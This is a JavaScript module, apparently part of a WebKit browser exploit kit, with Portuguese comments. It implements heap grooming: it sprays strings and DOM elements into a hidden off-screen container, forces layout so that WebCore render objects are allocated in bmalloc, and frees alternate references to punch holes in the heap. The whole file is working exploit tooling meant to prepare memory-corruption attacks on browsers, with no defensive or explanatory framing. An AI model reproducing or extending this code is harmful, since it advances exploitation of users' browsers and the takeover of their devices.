/**
 * MOD_GROOMER.JS — Heap Manipulator (Versao 12.0 - DOM Nativo)
 * Atualizado: Alocacao completa de objetos C++ no WebCore e encoding limpo.
 */

export const Groomer = {
    trashStrings: [],
    trashDOM: [],

    sprayStrings: function(count, size = 1024) {
        let trash = new Array(count);
        
        // Evita a otimizacao de Rope Strings do JSC
        const baseStr = 'A'.repeat(size);
        for (let i = 0; i < count; i++) {
            // Slice + concatenacao forca a criacao de um novo WTF::StringImpl na memoria C++
            trash[i] = (baseStr + i.toString()).slice(0, size);
        }
        
        this.trashStrings.push(trash);
        return trash;
    },

    sprayDOM: function(tag, count) {
        let trash = new Array(count);
        
        // 🚨 FIX CRITICO: Elementos orfaos nao criam RenderObjects pesados.
        // Precisamos anexa-los a um sandbox real no documento.
        let sandbox = document.getElementById('groomer-sandbox');
        if (!sandbox) {
            sandbox = document.createElement('div');
            sandbox.id = 'groomer-sandbox';
            // Sandbox invisivel para nao quebrar a interface visual do seu painel
            sandbox.style.position = 'absolute';
            sandbox.style.top = '-9999px';
            sandbox.style.visibility = 'hidden';
            document.body.appendChild(sandbox);
        }
        
        for (let i = 0; i < count; i++) {
            let el = document.createElement(tag);
            
            // Adicionar ID engorda o objeto no bmalloc
            el.id = `groom_${tag}_${i}`;
            sandbox.appendChild(el); 
            
            // 🚨 FIX CRITICO: Forca o WebKit a desenhar o elemento AGORA.
            // Isso obriga a alocacao imediata do RenderStyle e RenderTree na RAM.
            void el.offsetWidth; 
            
            trash[i] = el;
        }
        
        this.trashDOM.push(trash);
        return trash;
    },

    punchHoles: function(array, step = 2) {
        // Metodo Queijo Suico: Cria buracos na memoria libertando referencias
        for (let i = 0; i < array.length; i += step) {
            array[i] = null;
        }
    },

    cleanup: function() {
        this.trashStrings = [];
        this.trashDOM = [];
        
        let sandbox = document.getElementById('groomer-sandbox');
        if (sandbox) {
            // Destroi a arvore do sandbox de uma vez para forcar o GC a varrer em bloco
            try { sandbox.innerHTML = ''; } catch(e) {}
        }
    }
};
